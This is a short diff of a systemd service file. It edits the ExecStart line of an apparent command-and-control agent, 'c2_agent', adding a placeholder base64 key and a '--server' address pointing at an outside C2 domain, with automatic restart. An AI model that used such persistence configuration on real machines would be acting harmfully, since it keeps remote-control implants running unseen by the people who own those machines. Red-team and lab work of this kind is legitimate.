@@ -4,7 +4,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/home/noob-debian/Documents/Vscode/C2/c2_agent /home/noob-debian/Documents/Vscode/C2/c2_agent --server https://c2.trazento.site
+ExecStart=/home/noob-debian/Documents/Vscode/C2/c2_agent --key YOUR_BASE64_KEY_HERE --server https://c2.trazento.site
 Restart=always
 RestartSec=10
 
